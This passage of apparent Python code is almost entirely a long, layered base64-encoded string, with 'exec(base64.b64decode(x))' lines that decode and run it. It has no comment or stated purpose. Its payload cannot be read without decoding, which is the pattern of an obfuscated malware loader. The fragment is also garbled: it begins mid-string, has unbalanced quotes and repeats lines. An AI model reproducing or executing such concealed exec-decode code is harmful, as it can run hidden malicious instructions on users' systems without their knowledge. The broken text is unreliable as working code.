lWSldjSEZWTUZVeFdWWlNWVk5xVWxKTlZrWTBWbTAxVDFaR1dYaFRhMnhoVmxkUk1GWlVRWGhXTWs1SllVWm9hRTFZUWpKV2JGSkxWVEpTUjFWdVZsSmhlbXhaVlRCV1MyVldXblJqUlU1clRVUkdTRmxyV210aFJrcHlZMGhDVlZZelRqUlViRnBoWkVVMVYxcEdjRmRoTTBJMFYxZDBiMkV4WkhSVGEyaFdZVEpvWVZsc2FHOU5NVnB5V2taS2JGWnVRa2xaYTFVeFZHeEtSbFpxVWxkTlZrcEVXVlJHU21Rd01WWmhSazVvVFZWd1VWWnFRbGRaVjA1SFZXeG9UbFpHU2s5V2JYTjRUVEZhZEU1Vk9WZFdNSEJIVmpKNGExZEhSWGhYYldoWFRWWldORlZxU2s5U01VcHpXa1pPVjJKSVFsWldiR040VGtaWmVWUnJhRlpYUjNob1ZXcEtiMWRHY0Zoa1IwWnJZa1pzTlZrd1ZqQldNa3BXVGxWa1lWWldXbFJXVnpGTFYxWkdkRTlXV21oaE1IQm9WMnRTUjJFeFNsZFVibFpWWWxkb1QxVXdaRzlTYkZwWFdraGtVMDFyV25sVVZtaFBWMGRHYzFkdFJscGlSa3BJVlRCYWQxSnNaSFZhUm1SVFRVWnJlVlpxU2pCa01WVjNUVmhXWVUweVVsaFVWbHAzWTJ4c1ZWTnJkRk5pVlhCSFdWVmFiMkZYU2tsUmJtaFlWbXh3V0ZWNlNrOVdNa3BIVjIxR1UxWXhTbEJXVnpCNFlUQTFWMkpJU21GU1JVcFZXV3RXYzA1V2NGWlZhMlJYVW14d1dGWXllRU5XYXpGWFkwVm9WMkZyV2xoYVJWcHJZekZXYzFwR1pHaE5NRXBZVm14U1IxWXlSWGhpUm1oV1lteEtWbGx0ZEV0Vk1XeDBaRVYwYWxKc2NIaFZWekZIWVRGYWRGVnVjRmRTTTFKUVdWZDRTbVF5VGtsYVJscFhaV3hhUlZkV1dtRlhiVkY0V2toV1YySkhhSEJWYWtwdlZWWmFSVkpzWkZaTlZsb3dWVEZvYzFsV1NsbFJiRTVWVmxaYWFGcEdXbFpsUmxweVQxWkthVko2YTNwWFYzUlhZakZrU0ZOdVRtcFRSVnBoVm0xNFlWUkdjRVpYYm1SVFRXdGFTRlpIY3pGV01ERkZWbGhrVjJKWWFISlpWRXBIVWpGa2NWZHNXbWxXUmxwYVYxZDRVMVl4WkVkVmJGcGhVbXMxV1ZadGN6Rk5SbkJXV2toa2FWSXdjRlpaYTFwRFZteGFSbU5JY0ZaV00yZ3lXa1JLUzFKc1ZuTlRiR1JPWWtWd1RWWnNXbE5STVVsNVUyNU9WV0pHY0ZaWlZFSjNZVVpTVmxwRVVsUldiWGg1V1ZWYVQxZEhTa2RpUkZaWFZucFdVRll3V2t0U2JVVjZZVVp3VjFZeFNrMVdha0poV1Zaa1IyTkZaRk5pUm5CUFZXeG9RbVF4V1hsa1IwWnBUVlpXTTFSV1dtOVdWMHB6VTJ4b1dtSlVWa1JXTVZwVFYwZFdTVmR0ZUZOaWEwcElWMVpXWVdFeVNrZFhibFpTWWtkb1ZsWnNXbFpsUmxaeVdrVmtWMkpGY0RCVWJGcFRWakZhVlZaclVsZE5ia0pFV1hwR1MxSXhTbk5oUjBaVFYwVktWRlpHVmxkWlYxSlhWbGhvVjJKVWJGZFVWM2hoVjFaYWRHVkdaR2hXVkVaR1ZtMTBWMWRzV25OWGEyaGFZbGhvVUZadGVGTmpiRTUwVW1zMVUwMHlhRWRXYkZwaFlUSkZlRlJ1VGxOWFIxSlVXV3hTVjFaV1duTldWRVpTVFZkU2VGVlhOVTlWTVVweVYycENWVlp0VVhkV01GcExZMjFLUlZWc2FGZFNWM2N3Vm0wd2VGVXhaRWRWYmxaV1lrZFNjRmx0ZEV0bFZscDBZMFU1YVdKV1JqUldSbWhyVmxkS2NtTkdXbHBXUlVWNFdrUkdWMVl4Y0Voa1JsSnBVbFpaZWxaWE1IZE5WbHBIVjJ4YVQxWlZOVmxaVjNSTFpXeFdjbGRyWkZoU2JrSkhXVEJhUzFSc1NsZGpSRVpYVmtWYVdGWkVSa1psVmxaWllrWldhV0pGY0hkV1ZFSmhXVmRPYzFac1ZsUmlWR3h5Vlcxek1WZFdjRlpWYXpsb1RVUkdSbFZzVWt0V01VbzJVbXQ0VjFKNlJsaFpNakZQVWxaR2MxcEhhRTVpUlc5NVZqRmtNRll5VFhoVWJHUlZZbXhLYzFWcVRrTldSbkJZVFZST1RsWnRVbmxXYlhNMVZXc3hSVkZxVWxwaE1YQjZWbXhhV21WV1ZuVlNiRlpYVWxad2IxZFVRbUZqTWsxNFkwVnNWV0Y2VmxSVVZsWjNVMnhhZEUxSWFFNVNhelY2VmtkMFlWUXhUa2hoUm14WFlURmFNMVpWV25OamJIQkdUbGQ0YVZKcmIzZFdSbHByVFVaWmQwMUliR2hTUm5CWldXdGFkMVF4VWxaYVJXUlhZbFpLU0ZVeWN6RlZNV1JIVTJ0NFYxWnNTa1JWYWtwTFl6RlNjMWRzVm1oTlNFSnZWa1pXYTA1R1NsZFdiR1JoVWpOU1ZWbHJWbGROTVZaMFRVUkdXRkl3Y0VsWlZXaGhWMnhaZW1GRVRsZE5WbkJJV1RGYVIyTnRUa2RVYkdScFVqTlJlbFp0Y0VkVk1VMTRWMWhzVmxkSGVGZFpWRXB2WTBaVmQxZHVaR3BTYlhoWVZtMTBNR0ZWTVZoa1JGcGFZVEZhVUZsV1drdFdWMHBKVm14V1YxWnNiRE5XVkVvMFVtMVJlRk51VWs5V2JFcFlWbXhTVjFKR1dYbGpSVTVxVFZWd1NGVnRlRzlaVmtwWlVXeE9WVlpXV21oYVJscFdaVVphY2s5V1NtbFNlbXQ2VjFkMFYyTXhWblJUYmxKc1VucHNXRmx0TlVOV01YQkZVbXMxYTAxWVFraFpNR1J2VmpKS1dHRkZaRmRXYkhCMldrUkdVMk5yTVZkaVJsWm9Za2hDVjFadE1IaFVNRFZIVm01U1RsWlViSEpXYlhNeFRWWlplVTFZWkdoU2JIQlpXbFZTVDFadFJYaGpSV2hoVWpOb1ZGa3llRk5rVmxaMFlrWk9iR0V4Y0UxV2JHTjRaREpOZVZOc1pHbFRSa3BQVm14a1UyTnNWblJPVlU1WVVteEdORmRyWkVkV1IwcEdZMFZhVmxac1NsaFdhMXBoVm1zMVZtVkdhR2xYUjJneFYyeGFWbVZHWkVoU2EyaG9VbTFTYzFsclduZE5SbHB4VVcwNWFrMVZOWGxVYkdoTFZtMUtSbU5JUWxWV2VrWlVWWHBHVjFaV1JuSmFSMnhwVWpOb05sWXlkRmRoTWtaelUxaGthbE5IVWxsWlYzTXhVa1pXYzFkc1pGaFNWR3hHV1d0V2QyRkdXWHBWYXpGWFRXNW9kbGxxU2t0U01rcEZWbTFvVTAxdWFHaFdha0pXVFZkTmVGVnVVbXBTYTNCeVZtMHhOR1ZHV1hoVmEwNWFWbXRzTkZZeU5VZFhiVVp5WTBaU1dtRXhXWGRWTVZwMlpXeEdjbVZHV2xkU1JVVXhWVEZrYzJOc1RYaGpSbXhvVWpOb1lWcFdaRzlqUm1SWFlVVTVhVkpVVm5oV1ZtaFhWMjFHYzJFelpGaGhNbEpZV1ZjeFNtVldWblJsUlhoVVVqSlNNMVY2UmtaUFZrSlVVMWhDUkdKV1dUQlhiR1JPWWpGc2RGSnVjR0ZXUm10M1ZFY3hTazFyTlVoVmJYaGFUV3BzY2xkc1RtOU9SWFJVWVhvd2FVdFJjR3hsUjFacVMwZEthR015VlRKT1F6VnBUbXBTYTFwWFRuWmFSMVZ2WlVOcmNDSXBDbVY0WldNb1ltRnpaVFkwTG1JMk5HUmxZMjlrWlNoNEtTaz0iKQpleGVjKGJhc2U2NC5iNjRkZWNvZGUoeCkp")
exec(base64.b64decode(x))")
exec(base64.b64decode(x))